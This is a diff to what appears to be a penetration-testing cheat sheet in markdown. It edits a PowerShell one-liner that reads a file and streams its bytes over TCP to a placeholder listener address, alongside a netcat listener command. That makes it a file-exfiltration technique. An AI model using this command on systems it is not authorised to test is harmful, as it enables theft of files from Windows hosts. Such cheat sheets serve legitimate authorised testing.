@@ -19,7 +19,7 @@ nc -lp %ListeningPort% > file.ext
 ###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; On the Windows host run the following in PowerShell:
 
 ```
-$FilePath = "$pwd\file.ext"; $LHOST = "%ListenerAddress%"; $LPORT = %ListeningPort%; $FileContents = [System.IO.File]::ReadAllBytes($FilePath); $Length = [System.BitConverter]::GetBytes($FileContents.Length); $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $NetworkStream.Write($FileContents, 0, $FileContents.Length); $NetworkStream.Close(); $TCPClient.Close()
+$FilePath = "$pwd\file.ext"; $LHOST = "%ListenerAddress%"; $LPORT = %ListeningPort%; $FileContents = [System.IO.File]::ReadAllBytes($FilePath); $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $NetworkStream.Write($FileContents, 0, $FileContents.Length); $NetworkStream.Close(); $TCPClient.Close()
 ```
 ###### If not running from the same directory as the file location, then change ```$pwd\file.txt``` to the proper filepath.
 
